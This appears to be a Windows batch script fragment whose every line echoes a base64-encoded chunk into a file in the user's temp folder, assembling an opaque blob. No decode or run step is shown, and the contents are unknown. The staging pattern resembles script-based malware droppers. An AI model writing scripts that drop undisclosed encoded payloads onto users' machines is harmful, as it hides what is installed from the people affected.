echo M768s5q/sTN7sD7lyuwKA123r2X46aYQrgro/iBKW94M4f4Aaj0XwolraJhyCOu3 >>%temp%\data_encode.txt 
echo PoSbBXRzSwg37ZMQ7sYyGt7rSPu7C7Tj32WW9gkDDbMKUMvM/6f/SR/552f7J/0X >>%temp%\data_encode.txt 
echo /yI5yd/+K3zMv44hCuz+Cf7lP/v4r9n9c/iX/6xxpf/H139+wWv6wmWvL19RtNLw >>%temp%\data_encode.txt 
echo xqo331r99jvvrlm77r3173+wYeOmDz/a/PGWT7Z++tl/ird9vn3Hzi++3PXfr77e >>%temp%\data_encode.txt 
echo /c2evSX79n974LuDh0qNZeWHjxw9VlF5/PsTP5w8VVV9+szZH386V2M6f6G27uLP >>%temp%\data_encode.txt 
echo 9Q2XLjdeuXrN3PSL5fqNm78237r9253f795ruf/Hnw/+am3jBA6OQidnF5Grm7tH >>%temp%\data_encode.txt 
echo p85iSZenunp2697Dq2evp717P9NH2refj2//AQP9Bj072D9gyNBhzw0PHPH8yBdG >>%temp%\data_encode.txt 
echo jQ4Khjnt+BBZSiosPdMzlJkLVFnq7JyXNFpetzB3Ud7iOXPnzU9KfrL/y0uWvvLq >>%temp%\data_encode.txt 
echo /9fl//+9/EMnhIVHTJwUOXnK1KjoadNjZsyMnTU7Lj4h8UUq/yf7/4+QP85fu7P5 >>%temp%\data_encode.txt 
echo mgN7NjmweasXm+91YvMtVzYn8WBzFQ/m5sHeUaOfu51fdxYXUczSlTA31ME9xQjd >>%temp%\data_encode.txt 
echo +zL355k9lNnDmD2GxZnJ3GMZxrP0E1neKuaeRcZ2jsMX6KjX0zBe8xmvBQxfY+56 >>%temp%\data_encode.txt 
echo lk4hi4+fM+FM4kNm/5jxsZXl8x/mvpfxdZL5n2P+iUKqD/NyobLw14Zyw4BGAI0C >>%temp%\data_encode.txt 
echo GgMUAhQOFAkUA5QAlAwEyytuEVA+0BtAq4HWAK0H2gi0GWgrUDHQDqBdQLuBSoAO >>%temp%\data_encode.txt 
echo AB0GqgKqYeHrgcxAzUAtQEI+lPMA8gLyBfID8gcaBRTFh9rWNAlgTgbKAMoBWgSU >>%temp%\data_encode.txt 
echo D7QCaDXQZqBdQKVAZ4HMQC2Yti6U8wTyBvIF8gcaATQGKBwoCmgW0FygNCAV0BKg >>%temp%\data_encode.txt 
echo 1UAbWfhioN1ApUBVQI1Ad4BECyFdIF8gf6AQoAygJUCxOjUXna2GtOVcvDyNm5Wh >>%temp%\data_encode.txt 
echo 4yZqlFysjEe/NNyfAP4EIYwWDRBOTU0chtcwI8YjJoir0zC3KTI1N1GewkXLNFxo >>%temp%\data_encode.txt 
echo jgYwj5sCeU7RqbhQXToXK8/hpqfy3LTshVy4PBXD62SaPIyjIQb4i0atAbbvHI0S >>%temp%\data_encode.txt 
echo 2yrEJwtkSIP4Qzo63H0BafFytpEB0sxGE6RrdcL0bebQaOgfQNHRQ9PShuaRdNLg >>%temp%\data_encode.txt 
echo z18aDX9SNOTBHxcZGZSVFURXzLEwW8b3T9GwvkacBXbyzg5+04g9A1ys79Lpu17e >>%temp%\data_encode.txt 
echo Fi8NbCQbFr/dTtPR2lxoeuoObjRtjZ2LNZ92O80PQ7W7TQGTmoSVkzfN0WDXkLEi >>%temp%\data_encode.txt 
echo h2A0CzmFlW0KWRGgv45LJ2nKyXgwnUslZZkGvC9EWYJ7qi19HUk1z5aPxs7Fmifq >>%temp%\data_encode.txt 
echo UKz5KkkeNE8541NH9h1wtrx1UFaelUtO9hHIYYRKYW+wKT/ZNjvlyz6ElceObqEc >>%temp%\data_encode.txt 
echo 2YYCY2M04y2aGwrySoPfPJZ/GvvnD6NhNPsntbnksX8czGMjuSBIPQt+tRxVqsiJ >>%temp%\data_encode.txt 
echo /mg2GWtroH+hnsorF8YqoPVALUDhi6juKh+wFOgB0Kg8GCOA6oH8FsO4sZjqtt4A >>%temp%\data_encode.txt 
echo XA9Uv/if9VxppP7lQEqyd+N/V9elIPUi76DpGv4v4qnAlAqhVOCzmPCgJC3cPp1/ >>%temp%\data_encode.txt 
echo k/+T08F61sKvipRO/hhdHPcv0seWl01ahJa0rQziLgO5ddQL/psyY3wNcU3vEHfY >>%temp%\data_encode.txt 
echo v9QpaomrAtweltI/x6cuGuDg4Zz/Oe4iwrnMJsXh/8g35tMeX01GGC3pT9YwaeCb >>%temp%\data_encode.txt 
echo +6950ZJeqSPS40ESVnnQ/q0gY0Kqre61j0lXDqXgH0m3I2dp4CojLSod2k42xPh/ >>%temp%\data_encode.txt 
echo lo59Ca2S69i67cubBmMQLbVVH4ypWXWwj5cHuuaAWzbZnaMiEteReI/2YpqmlTtr >>%temp%\data_encode.txt 
echo Hh3LQeeLoRr5RKVKHpqj1IZOi51M5qISogfOypFp5LHkzV3EIjJvkTCd7OPQhaEj >>%temp%\data_encode.txt 
echo w6iwaFmOLbadO75ykE+TZclnZUeFTQ7n2Dw1NCcnJlulTM2bJLcqn2fJNVlKNdmv >>%temp%\data_encode.txt 
echo ES3nM7LTrP235eVQQg8YcUsoCRmJmN2T2aXM7s/sk6dN5JRqBTctdBqnhnkHoF8s >>%temp%\data_encode.txt 
echo /OCcFOx+WvhBM7pPnhZOlF7orlSnEbN88LBhWJMxkNZcoAwgHigT6igAnlA4n15M >>%temp%\data_encode.txt 
echo 3gSEwfMG9f/Ye6eS+TV1n0Xm1jrwserHi/X03fcuPX33X6KnezxK9XQPQJWevvOv >>%temp%\data_encode.txt 
echo 0dM9CvV6+k7crKd7AJr1dM9Ii56+k+cK6bt6ESDOpSWFdI+AVyHdSyAFxPrwK6Tv >>%temp%\data_encode.txt 
echo 7IcV0nf1owC74rv9Qrr3IbKQvnOPAcQ5fAIgrl2SC+m7/IxCuocgp5C+819USN/1 >>%temp%\data_encode.txt 
echo 5xfSvRArAPEDvNWFdM/D+kK612AzIK5LigvpnoP8JXRvw65CulehpJDuVSgtpHsk >>%temp%\data_encode.txt 
echo KgDxfU4VIFZCTSHdm1BfSPcymAHxfXczILbtFkB8L84tC+VGohwAX0A5AI5COQCO >>%temp%\data_encode.txt 
echo RjkA4vtyP8DxKAdA1NyNAsR1UgggrpMiAbGxxgBORDkATkI5AOL70wzAKSgHwKko >>%temp%\data_encode.txt 
echo B0Cs+3zA6SgHQGwXqwHjUA6A2AY2A76IcgDEGc4uwFex/IACaAAHAB0AKwAdAc8C >>%temp%\data_encode.txt 
echo 4hlL2N6cAOvB7gx4HdAFsAUQv1QQvg7tAhDn7u6AErB7AHoDdgL0A+wMOAJQDBgC >>%temp%\data_encode.txt 
echo KAGMAuwipG37KUBs210BE8DdEzANsBtgDmB3TB/QC3AFYE/ANYC9ADcDPg24A9Ab >>%temp%\data_encode.txt 
echo sASwN+BhwGcAqwD7ANYCSgHNgH0B7wD2w4a/HNoDoAegL6AXYH9AX8ABgMMA8V69 >>%temp%\data_encode.txt 
echo MYCDACMBnwWcBTgYMBnQH1AFGABYCDgUcDUgHsW9EXAEYDHg84C7AUcClgK+AHgC >>%temp%\data_encode.txt 
echo cBRgDeBowEbAIDxwFTAY8AHgOEDRCmg3gJ6AIYBSwFBAf8AwwFGA4ShPwAjAuYAT >>%temp%\data_encode.txt 
echo Ua6Ak7AeAScD5gNOAXwDcCrgesAowK2A0wB3AU7H9gAYg+0BcCa2B8A4bAeA8dgO >>%temp%\data_encode.txt 
echo AF9E/gDlKL+iUG4B1jugCvkCLEC+AAUwgIQDCgFxHHMBjAG7K9oB3QAzAD3wM3RA >>%temp%\data_encode.txt 
echo /OYlH7Ar4BuAnoDrAbsDbgXsBbgLsDdgBaA/4FnAYMDrgOMAWwDDAIUrgS9Ab0AB >>%temp%\data_encode.txt 
echo DFT+gELAUYAugOGAroAxgG6AcwE9ADMAewHygMGAb2A6gOsxHRjQijEdwN2YDmAp >>%temp%\data_encode.txt 
echo pgN4AtMBrMF0ABsxHcBmTAfwAcaHAc/DAPEBvQBdAH0BXQGHAboBjgH0AIwE7AU4 >>%temp%\data_encode.txt 
echo CzAYUAUogIFxCYYHXIHhAddgeMDNGB5wB4YHPIzhYaA8i+EB6zE84HUMB9iC4QAl >>%temp%\data_encode.txt 
echo b0A4GDClgK6A/oBugKMAgwHD0R8GzFnoD5iM/oAq9AdchP5+wA/6A65Bf8DN6A4D >>%temp%\data_encode.txt 
echo 5g50ByxBd8DD6A4Ptyp0B6xFd0Azuo+A/onuI/DFDrgDegAKYED1QjugL9rHgLzQ >>%temp%\data_encode.txt 
echo DjgG7TCgRqIdcBYiDKTJiJHAJ2IU8IkIA2ThKnxGQz8F7AW4eVUoW4lyMD9LJ4hz >>%temp%\data_encode.txt 
echo f87uGRtJVlHormXrMhlDOZv3qGxrLoo0nIKsvhFp+hksPF2dc+CrZUjXl5ksXXye >>%temp%\data_encode.txt 
echo 0zmbiiG15zB7DguvYe4all4Gy0fLnvta7iWGCwnyZOXLkRUDnb9pWP5prPxyFt5a >>%temp%\data_encode.txt 
echo HpqPisVXMbuC8bmQlS+DrVdlIDEaj/KTxfiQQQxaLhmLn83iKVk4LfNfwDCP8ZHL >>%temp%\data_encode.txt 
echo +FzM+OZZ+Wk66Swfntl5xv8CVg9ZNnnImF3N4qlscl5A/PNISJyrL7St4XDWHUue >>%temp%\data_encode.txt 
echo 0SlkbTWBPI9TyRwsgrSIVDLPDSPP1zTiHk6ezWlkthwOoTg2k55E5mYKMuueSJ7n >>%temp%\data_encode.txt 
echo CpL+ROKeQcJP5qJY2wiAFjebtQ90j2VtBM2zWLsIgKd/FDGnEPN01j4CYBYQxdoI >>%temp%\data_encode.txt 
echo 8jyTtZMAME1nbQXNs1l7wbxmsjaD5Z3K2k0AlDyKtR10j2DtB+eWkawNoXkma0eY >>%temp%\data_encode.txt 
echo 71TWlpDPcDb/RB1EKGtbyE8ia1+Y5mTWxlCeEaydBUCucaytoXkWa2+Y5kzW5gIg >>%temp%\data_encode.txt 
echo xDTW7gKYJgXbHppfJLFwdaS2tUVrfWURfqIJnzxZ87xIeFtEykXNi0l4asZ2azUv >>%temp%\data_encode.txt 
echo IDxMInzS1fJEIs8Mws9kwk8W4Tma8Kwl5aX1QtdD0aTsCwgPU0mbWUD4n0ralZas >>%temp%\data_encode.txt 
echo XKeS9HWkLLMfKQtP0qd1l0L4p/nmMPlMY33Caubt3HnWxqax/tHOs8rOrLGZtXZx >>%temp%\data_encode.txt 
echo s0j4aGJOJTxPgpqk/cgqW9qXrDGsfQprOZGNlUpSu9GkdjloYbSUE4iEOLbCprLO >>%temp%\data_encode.txt 
echo IjKdRmQkYzzNsPWrMNL+qH6L8iFn8k2w9asJRI60z9DwtM9QdzWJa+0zPGm7tM4o >>%temp%\data_encode.txt 
echo xzEPyZ32Adpv7dtZGCmjioWR2/oJre8JRBL2dWkf3lr+CDL7t5YzgrQF+tyJtBtL >>%temp%\data_encode.txt 
echo Qgl/tMyhpP5pmansaZnDiOzsy/Aof7QM1rxjCLfWvKNITdG8YwkfNO8olp/algfN >>%temp%\data_encode.txt 
echo exLrmxqbjDOY7CkfWfA8s0rZmkc4qVOaRzTxseYx2ZYHrXc5G1tn2vKIYu1ey/J4 >>%temp%\data_encode.txt 
echo uI5ofrEdyhTN+KXtPcKWbgxxV7AwYTa5PT5d2SPlmEXqVm43htB0w0ko+7Q61gFN >>%temp%\data_encode.txt 
echo qyOP08n4RdOawsxaMsZFsDhaW81Z4ySystA6mWAnr+ksjvqROLQn0jgT7GRMWwEN >>%temp%\data_encode.txt 
echo M4XEp2FmsTanJW1upl07mWBX9ni7thhmCzOVuatJ+pF2/EXZwoTa1cdswpuMyS3S >>%temp%\data_encode.txt 
echo jrd29xl2cp7A+NSScsXZzJGsXrSkxibbpTOzw3xuFqsPOj/AtfAEtobHNX7FmlAy >>%temp%\data_encode.txt 
echo c0KdCf6dBTuevFYPiGcuXgfE0z9bADfj+9a1objfiJMA4rHW3oA/4pofEG9hHLGW >>%temp%\data_encode.txt 
echo XI3FhQDuQx0V4GFc4wPWYh9YS3UAOYB4tOoSwEO4pgesYDoH1EmsATtePL4DcAHT >>%temp%\data_encode.txt 
echo ZaCO4zDYU5luh3wfs5bqEmoBl6LuAnAv0/mQvX3rqOyrmA7IYx3VNXgBLmc6INQJ >>%temp%\data_encode.txt 
echo +YI9kumCUDc0DOxb8BsAQHzHGrmO6iZmAeIFvMmA25mOASWnAruB6ZBQp7RkHdVh >>%temp%\data_encode.txt 
echo NDPd0gqw40E7awB/QF0FIN4btwMQLzosAXwHyweIJ9dXAR7BcgHiPXNmwJ/wuw7A >>%temp%\data_encode.txt 
echo KizXe1Q34gFYiuUBPMN0VqjD8gU7HpU5DBBvehgDiO98IwGPYzkAv8FyABqRf8Cz >>%temp%\data_encode.txt 
echo OD8AxHfHhYB4BtVqwJ/x+ybAd7GdANbjvjHAb1GnBIjvlE8A4tF9NYAX8HskQDxi >>%temp%\data_encode.txt 
echo thkQTyR+AHiU6aBQNyVaT3U0LUz35Al2FdNFoY5KCvYMpntDXZz/ejpHQ13TENQp >>%temp%\data_encode.txt 
echo gV3LdHKoowsHO95LEgP4KeBcwC9wnF5P50w84B7UIQEeYDoj1FW9AfYVTPeEOq31 >>%temp%\data_encode.txt 
echo 66nOSMJ0flvXU90T6rZQB7YL7DzT0aHu7gDYv8R+tJ7qnryYjvDseqqrQl0afq9S >>%temp%\data_encode.txt 
echo vx51mlRHh7q76+tDyUxdynSJLeupTsuP6RSF74dyeBClBHAG0ymijtH7fTo+oe4N >>%temp%\data_encode.txt 
echo dXN+YNcwXRu+yRgB9kVMZxaE/RDsrzFdZBemI0PdXBS4F6GcAGOZjg412xlgz2O6 >>%temp%\data_encode.txt 
echo QdQZ8mBPZzpD1CXmgx1XOG8Avsl0gqgzXA923MuwFVDPdHP4Tc4usL/OdHfBKC+w >>%temp%\data_encode.txt 
echo FzIdIep9K8COl3qeBcQVUP37oWSlc/19+uwPYbrUFrCvQ7l8QOcHEsD3mE4Vdaze >>%temp%\data_encode.txt 
echo YF/FdImoo/QD+ytM14q61xEfUF1hAtPBhnxAdYZRgHiDagIgnoScAfgRyg+wmOlm >>%temp%\data_encode.txt 
echo UVe7AuwJTEeLd8muAXsi00Xit0Kbwb4M+zMg7rkoAcT11WHAjUyXizreKrDPYTpZ >>%temp%\data_encode.txt 
echo 1NXWgh1XpGZAvM+iBRBPOhFtCOV2YXvaQA8X9wP8HusJ8BjTCaOuOBLsczm6tr+M >>%temp%\data_encode.txt 
echo /RrseH2LChAvqiwE/Az7L+D7TIeMuuXdYMdDQEsB5zHdLH6DdQLsi5kOFXW3NWBf >>%temp%\data_encode.txt 
echo yXSyqOs1gz2f6WZR53sH7AVMJ426am5jKPk+ygNQzXTUqLv2AnsS0/ni3hlfsC9h >>%temp%\data_encode.txt 
echo umrUYQ8DewrTZaOOewzYk5muGFUkkWDHPS7JgC8zXTXqsBeBHVfWhYC40l69ker8 >>%temp%\data_encode.txt 
echo NwNewvYHiEecHgDEvTEVgF9hewP8HNPZSHXQ1zeGknfudB20mPRN+iyWkXGKmlPI >>%temp%\data_encode.txt 
echo mCRjb7sW28xy0keoWUmep9ScSXii5gWkfVOzipTVas6zmbPs8s0m/YmaX7Jz13Yw >>%temp%\data_encode.txt 
echo t8elszhqzmM8Lyb8LyZvI9vnZvbuKrv5H123ppA0qR6Aaono+ktJQtE5aQqZ29nH >>%temp%\data_encode.txt 
echo pboCqg2iuoJUIh+6hkon5aV6gzTyPKdzYbpXg5rpXoU09lZdbjOrSP1azTq79VUW >>%temp%\data_encode.txt 
echo 02BQvUM6GQfl7P2ezmZOIXzI2TtZmZ05xWZOtzMrSd7UnEnqQM7eUbank0N4pWaq >>%temp%\data_encode.txt 
echo qaFmHSk/NS+2y2sxqXs6P5MxPqkcs23mVFI7VrO9e3v4NDt3uhfEatbazOmMHzRn >>%temp%\data_encode.txt 
echo kNqh5izyXKBmNZEpNecwPqlZbmfW2JnzbGaqYaNmnZ37QhaXJ/zIbfoIyhvVayhJ >>%temp%\data_encode.txt 
echo mlQ3RDWGVL9AtWQK1sfkNjOtL6s5w2ZWsHQ0tjahYP0n1bZWp/lSHQFtu1T3RPfB >>%temp%\data_encode.txt 
echo UF2G1V3D2rTVTLWLVD9FNZhU/yIj7YHqfagmkeqtqHaTrsEpn9RMtZ30XWYmGV+o >>%temp%\data_encode.txt 
echo biWdlJHqRxaQdrXAro9Z9QtK1rfoO88FhCeqR1lA+qWK7Ubgbfokqr2kOgXaXqke >>%temp%\data_encode.txt 
echo iGonqf6DpkpXTVnMrLFzp+2y3ZxF6jiLve3mbXo4qqmlugZaZ9RMNblq1meybfoO >>%temp%\data_encode.txt 
echo 2h9yWDtQ23R4VNNLdRMppIzUTDW/1vV7CtOjWu209bfbc5g+lOr/qLaY6v+oxlhr >>%temp%\data_encode.txt 
echo l6/WtvPGaqZ8atlOEblNR6hlOlMVMSvt1rVWPbXVrrXpk+na3N4/8yF/tS339jVv >>%temp%\data_encode.txt 
echo u/0l0s5UtrU1HWtTO6ytNY8dg7XsmZDz2PDUXfWIrscqh4V2Zc8lbUxup9vSMj01 >>%temp%\data_encode.txt 
echo bydHnvUntU1fSrXuvN34x7Nnk8am06P1QfWlOhKG6lRziKxpbeoeeWbZu9uXgepI >>%temp%\data_encode.txt 
echo FxIb1W3SfOn6F/ui1u79Btr5Dna1zZxB8qfmLFJ71KwlfW0xK1+uTW9K8+Ea3WfR >>%temp%\data_encode.txt 
echo b8gkqQHzjy1g352F/HKDn1i10f8jD/LA/X3f9kNb55bfGpTam2oIv/lrhNPh08sV >>%temp%\data_encode.txt 
echo 79zvFqwKp3EkptXyNf4TUs4JIvp90GPAwOk4Dw1xWOtiLIrz9f7PH0fSsyq0tVk7 >>%temp%\data_encode.txt 
echo LRqy8dV4Mm3gltTjXlt/7f9y9Q85v/68oM+4XzYl0Q/hGtWt5T9kehxQDO8zeoij >>%temp%\data_encode.txt 
echo Q8SL/VtOvxQ3paz8PCxOJW8NKRaFffX5kl593ww5ufI395OHCwe6W5aUr+m/czJO >>%temp%\data_encode.txt 
echo tkN61Z2f9dGJQ7LE2u3b5x7zCHf6Pb37geqZX+79c9Cqt5LXkIMMuL4eK7/tsfXN >>%temp%\data_encode.txt 
echo L+O2fTTJeeRXU+fVJ9Xmu33e2hxierO4Kr/XAh/oommjooavOxav/3HClEZZv22m >>%temp%\data_encode.txt 
echo sZIx32l+u/I23y2xtNNnva+rTM9KzlwlC5pn5simq5XPvuzlfSlGOHhE3dCbA2NS >>%temp%\data_encode.txt 
echo 33+p8rPuTVPe9Bsi6pGtntxL3ROlHTJ8QMhOYYzmmfs/Vq8Z9O0PcxTrhgRvubD0 >>%temp%\data_encode.txt 
echo D/mO2Iu5G7ZId8XeP3R0e/81U6MvC7mCgPI/71T1mxnjJ9772+2u8V09J9QunTf6 >>%temp%\data_encode.txt 
echo p/d7JrZ4j3qH+8nz69f35X66WNa696lMGawmG7v0XpVeHiftsybIMNJ1g0iZ891B >>%temp%\data_encode.txt 
echo +UKp5fCADZvM6d3Urt02Db49/KWuMyIPntxyJWLmqzgTl3y7aM09h1L+6Te4ec27 >>%temp%\data_encode.txt 
echo dEcvbPPcZ7r0s0Ysj5rql9u9/m5W2dthM05Vrh04e/ulnwZeLd742X/HkrYyper6 >>%temp%\data_encode.txt 
echo neYVPq8eyXJLyBYeCiufF9ASKepy0ztx8x9+zXd+GP/pkJ6bX/rpwPJw5VKB+r5k >>%temp%\data_encode.txt 
echo U1yvPN3Wtziu4at9Y3QrXnu3+/gfFgTtLrq4/EPRxIjoDI/PLvz19ru+P3e9njFs >>%temp%\data_encode.txt 
echo YPju92+GFuwpP+6QcGtGhmlL/4VLV700DVpQ2p9X9S/eFu+MX9Plm3xO8c0g6anT >>%temp%\data_encode.txt 
echo R84tzRr/qXf03h8u5mw6Pza0+95px6teWt+18dzqoJDpl8Zvv5+dGz3g6pduZAvS >>%temp%\data_encode.txt 
echo c7O3u55O8Pjs+wGyuOV670zjneW6heZw/1OTNod+6CSqHOe8f7O54tS12aV/NHwV >>%temp%\data_encode.txt 
echo Lvh11ytSX21/TXXB/ZLGL5y6uYSkBC+ePm/rycDQS9OzssR9bwfGXYnrauz/3jmL >>%temp%\data_encode.txt 
echo X6Fl3Znc4MnPfBHQZ5J01M511Sf/WHnhh4vTXi/NmP3xPOVXRWOe8n0pYiksiUO9 >>%temp%\data_encode.txt 
echo B07poY7/IuX650X9fq37c8uexl8betz+ThGYv2L3C+P8Sw69fXFHT1HanbPTMtue >>%temp%\data_encode.txt 
echo 75wZl+6570LI8eBnF2VsGL7AdOTL3w8o01Dl0HgnKf/PL6tn3yiWTtnQEv/edrfW >>%temp%\data_encode.txt 
echo LwQvf+Y/Rbn20DODvA8f+/z0jzULj42s9ph9/t3Vm459UPz91P5eC5s7ua4ovsdL >>%temp%\data_encode.txt 
echo +gQ96BJ5ZeebqYmSa9+/Z1aeGzBO07j79c9Xz+k3OnCjzmXx1LebJgXk3ld/cC3E >>%temp%\data_encode.txt 
echo vfvhlnc8JM1Jt7uoyvtPMNyv3PS2u/bLJW1OywLCdil1gwP8C+M/k/zap4oLWXzs >>%temp%\data_encode.txt 
echo SkqJOXNFjeTK+h8qjswukszek1h19uCfCc+9VuLYMyLKcXRldM8d3JE+l0qj8j7O >>%temp%\data_encode.txt 
echo rwyuDvhvU0u/rPkfFI16uaZn3knNwqOLPtp3JW+a45pGtmf+46azc1XZSxs3XDMF >>%temp%\data_encode.txt 
echo 3/84OyV3xgjDUXPi4IsJF8ecSmib2K/bkvjiRN21AbHpuT1S9161JLn9dVk52hz4 >>%temp%\data_encode.txt 
echo /Gan4uX7nrsbJu7T90LYizXrfn96+5ae4zNQt5bWuvTgUGHl1F03fm84P+3jt7QX >>%temp%\data_encode.txt 
echo XBs33pye3umjbtt++uabu53XjdK+XTbZcuK9wUlrx48S3/36bannC4uqf55QbbzY >>%temp%\data_encode.txt 
echo b1y3+J+/XJl05fdcw/Frn8yZOdRx7PRrE8ihZ5K6OzNdI+Y1TNj9xZARX3+S/ckP >>%temp%\data_encode.txt 
echo 49WL/XbfyzVOrao4nV7fUvxFenDlzq/jKlTumzat5YyRc8auPDjlzkjTzGjzhZeO >>%temp%\data_encode.txt 
echo 9PW+71oQMSWz5vNzS6IaRBs/3aDjVoxp7EGH6nfOSm4JD2rSvDyMI5f/uX2R56Av >>%temp%\data_encode.txt 
echo ZzwY/Z6lf7dhg6PcOzt+HDym1W//gxW5CWEflmxtHKstuz1xyfoU/i1x354Xvtjz >>%temp%\data_encode.txt 
echo yZCvPGM+X7V99C8TRqx7b9vPPwtaz/x2Ot8hbzPqkwQbNsbc2ll7zH/n2FEvRB/V >>%temp%\data_encode.txt 
echo VqVn/eJcvGFGy23Hw1saZm4O8pGc26ZdFr7f9NQpR6/lORuCameaZ351ZdqfPVyG >>%temp%\data_encode.txt 
echo fhZ9sOHcdrfpN1LeePn6vpN9QxRnOX23j6/qLp+4PWhoYQEZ6Xvkpv35+5mXxi7c >>%temp%\data_encode.txt 
echo 3DTUc6ki6k7gkFslv73ZSdxVuSZKWywekBzSVTDGbcVLJ/oGfPrCr5XnV+5+7tsJ >>%temp%\data_encode.txt 
echo oVH3f1I5GSpKBE6Xltx4b+ZhWXnK5zXnl1/8JbBEltG85rsPTnTN/NG4KoA0GElX >>%temp%\data_encode.txt 
echo 88jFRz8c1P2O2/jJv5367NPcT3wObn1tzpYTQzWS518N33SwpGtZ8bThUZU7Az88 >>%temp%\data_encode.txt 
echo sL91x8LhfaOGDP+h67jdb7fmjDTN/XbZe54T/up1YmJL3airp5e7KHtUO/RqvfXN >>%temp%\data_encode.txt 
echo uC+27yvPvinyPkgfoiGfl4UUmHJb/Meea3hp/dBrP7qmztDU9Sz+cuKLz/50stbh >>%temp%\data_encode.txt 
echo 2da6iSdX+XYduPO0z96e3woPDz7hvPe45b+Taqe6bjruUHvkzRlXn8uPK3+zOGHo >>%temp%\data_encode.txt 
echo iAnPCA2eVw61dn3Q5iTOS03/a+SPioUxDftSUMEr25Xey01wurTBqSpY+9SF8UM+ >>%temp%\data_encode.txt 
echo +uTSpq9kl2pTnz0gHLBmw485snX9L5ft07l79vXv3Sc5s2vJluDTRdqlt5J/Pnf8 >>%temp%\data_encode.txt 
echo 6OCflc4vLC/xveH8rsKintwz+8Kqd3Wv8fNHfqA+8tze1SOPTPCreDPvC9+Lncnz >>%temp%\data_encode.txt 
echo PtT4wYof3/cPM/W6lr9lyNi7C8bmTX4tbNu1vClX/+r3Qc5P9b+eOu50buuq71Rc >>%temp%\data_encode.txt 
echo 2uWva6d9qhYVf/xhxFt8xaw3H8Qf5U+cLS+ZoE41xZ+Y883zTa1dVbIZh3td2L/2 >>%temp%\data_encode.txt 
echo m03Tbn0cc+1+7UuvproM/mjoxU396Fyi6Lv5Y+JeyL086pPvx07/8HSB/4f3tvLH >>%temp%\data_encode.txt 
echo 7pe/d807c1Rj0o6Nht9c/ri+4scdxhfHnTzx5bKc8X02nckKMHt4Le2RvUY5v8H/ >>%temp%\data_encode.txt 
echo zbTI0R+v7VIvHpEwpsfuNXcjB34XP2DJkPMG3ebV+cFd91wIWB15KusVYaPv+zH0 >>%temp%\data_encode.txt 
echo U3qoQkeY/whdOYGwEydweooTOHtxDs7PcA4u/TkHUQDnKHqec3Qdxzm6RXJCt5mc >>%temp%\data_encode.txt 
echo 0H0eJ/RQck4eOs6p02ucU+fVnJP4I85Z/AXnLDnIOXc5xbl0qedcnrrNuXR1Eoi6 >>%temp%\data_encode.txt 
echo eglE3QIEou5hAtf/BUwEguouJktTQ0vsXQlYFMe2rgHJFXDBXUAjKho0it0w0zPT >>%temp%\data_encode.txt 
echo 0z01wxZMEFkFNQmCM8oozIwMKHK9OprcqNd4RSVGc69KjAtJjEEWA4lG3E3cUFwQ >>%temp%\data_encode.txt 
echo jZJg3JO4BjUqr6p7BqYQSF7u/d57X97t76vv7zqnqrrq1NJLnT6n51iJay+zxLX3 >>%temp%\data_encode.txt 
echo Aolb73yJm2e5xM2rSuLm/aPE3dvVyb3PICf3vm7C9wIArqI7lscLWJdOAjRBnYF1 >>%temp%\data_encode.txt 
echo xUp0/7zvAr5+T4W/Q9IDsSYrxmisyoow1oYjI0McfsP0CGm0pWB1UIMHaabJNPXM >>%temp%\data_encode.txt 
echo X5u3oB0DbT9x2/EZe60t/0RvxbtceD8uHsQJ318b0wtH50YUjopz0I4eDzB9SZAd >>%temp%\data_encode.txt 
echo cVnYq3cjZq+N6hZSBROLu/ajf+rHk+U2Ha21p+VWUMEk3rLlvzVH0gwfHn13f/eF >>%temp%\data_encode.txt 
echo Mg0/d4jOdXn7ivg3ZVOsXw2qOCFbcd5pymNYv6r37LUf99TIts44fyfnzs72Wv+d >>%temp%\data_encode.txt 
echo aTnjml/XKrRIPGs4v+lM+V8nTdvaUWNvS0dNPRPcYaXnz+88seWshc76bHOTOY3u >>%temp%\data_encode.txt 
echo wExpQWGgFlSgkE9ryfIrGhpku1P7r6vp/FUDtJ89bSaF9pr27dq3xwENZjE0ymuO >>%temp%\data_encode.txt 
echo kz2XWiNK9CdbjT1saVZW2FBjl5XDmGocV7jSZtMMkGwxCC8+yRNNwouNZVpG5rP9 >>%temp%\data_encode.txt 
echo 09Jxya3AeRb0ro8ernDBFq0ubFudsAi6UL88dZ2q4NGEuLDFnAf7fru0Q/ZjJbZg >>%temp%\data_encode.txt 
echo 9Xf/mvegl9m45ri3jAcVY+urP8mH7wPgGj3UG/En7q9/9AGE9+feTmHaI/5PY5/v >>%temp%\data_encode.txt 
echo tQmeizsGvXb0RPwDTrnqj+BbVZUHE07054Fmz/DAgE9gv5CzD87loPz5p81d/Arh >>%temp%\data_encode.txt 
echo 9KhP/RbdRfEJt2/2++dWeDI+9nlYi+pXoX/i3aMYvjP57XbW7+SIv8/6wvISeHdD >>%temp%\data_encode.txt 
echo ypHNe0eg+l573eKyDa79y/sDj+3phcp7efGMqZ/BHGN+16vOfVD+S5Hup8vgvIjI >>%temp%\data_encode.txt 
echo w98D1B6N74CSwM+hLGGy1HybQfk3xW175wt4IHK67+udhvCg9prT4Ovb4aFD/vOG >>%temp%\data_encode.txt 
echo HL/Bgfy0XSVBX8Jroxbf7fz9IHT9KVtdFu+Em2Z8tm7D34fywIfb94/0Chj66Nsf >>%temp%\data_encode.txt 
echo F88NwPLcrO64C2659cah0L89z4PKzB6wbBc82bD8tqe7BMVHuzyN3g0rZvhpXDc/ >>%temp%\data_encode.txt 
echo 5UDtvT5U/W6onejV8cB9igdRMzub8/ZAXYbXTHgNzcf8ktjMIXuh9JXt+1yPYnk8 >>%temp%\data_encode.txt 
echo feT79V4YnXo5KNjHnweUa9eslH1weK+Pim9eRPnBz15ed/bBbsnq4d4/QRTP7blu >>%temp%\data_encode.txt 
echo 8X5YuWrF42F5P3AA+KUl+hyAR+I0KQU+PLpen4Z3Sg7AfYFLU4dJUPvyj05aBw/C >>%temp%\data_encode.txt 
echo tQPnv7Vrvw8Pbo3p0OnwQXgx/9j7JXVIXpVXfro49iv4fW1DjpOPL6rPiZf6XfsK >>%temp%\data_encode.txt 
echo +vjeSesUiMaHxnnReuPXcM74F8s33whE+WP2fQYOQctHugjDPXQ988NZlxccghn5 >>%temp%\data_encode.txt 
echo 2QMGNiB5afw/r3vuMJy1I/5Ij0NYfmknVy89DDM2X84L29aJB7ndkn/pcgS6r9iy >>%temp%\data_encode.txt 
echo 9JzUiwceTz4eu/YItKSd2T7wz6h+E2bH8D2PwkvL/e8YVtOo/k7nh713FM6/PTf3 >>%temp%\data_encode.txt 
echo /g3Ez82bntjvGAS5va7f+PRP6Prn+llXHYOpK+7U/8UyALXHNXS8WyWcMyh24Pip >>%temp%\data_encode.txt 
